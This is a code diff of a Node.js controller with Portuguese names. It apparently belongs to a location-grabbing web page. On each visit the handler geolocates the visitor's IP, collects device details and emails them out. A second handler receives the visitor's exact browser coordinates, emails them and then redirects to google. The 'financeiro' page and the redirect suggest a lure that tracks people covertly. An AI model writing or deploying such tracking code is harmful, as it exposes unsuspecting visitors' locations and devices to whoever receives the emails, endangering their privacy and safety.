@@ -13,14 +13,15 @@ class IndexController{
         async function getLocalizacaoPorIP(ip) {
             try {
                 const response = await axios.get(`http://ip-api.com/json/${ip}`);
+                console.log(`IP: ${ip}`);
+                console.log(response.data);
                 return response.data;
             } catch (error) {
                 console.error("Erro ao buscar localização:", error);
                 return null;
             }
         }
-        let result = await getLocalizacaoPorIP(ip);
-        console.log(result)
+        const dadosLocalizacao = await getLocalizacaoPorIP(ip);
         let useragent = req.useragent
         
         const dadosDoDispositivo = {
@@ -30,15 +31,18 @@ class IndexController{
             platform: useragent.platform,
             source: useragent.source,
         };
-        await ServiceEmail.enviarLocalizacaoDoDispositivo(dadosDoDispositivo, result, result['lat'], result['lon'])
-        res.render('financeiro')
+        await ServiceEmail.enviarLocalizacaoDoDispositivo(dadosDoDispositivo, dadosLocalizacao, dadosLocalizacao['lat'], dadosLocalizacao['lon'])
+        return res.render('financeiro')
 
     }
 
     static async postSalvarLocalizacao(req, res) {
         const { latitude, longitude } = req.body;
-        await ServiceEmail.enviarLocalizacaoPrecisa(latitude, longitude)
-        res.render('financeiro')
+        console.log('Aceitou comprimento de localizacao');
+        console.log('Latitude:', latitude);
+        console.log('Longitude:', longitude);
+        await ServiceEmail.enviarLocalizacaoExata(latitude, longitude)
+        return res.redirect('www.google.com')
     }
 
     static async getIndex(req, res) {
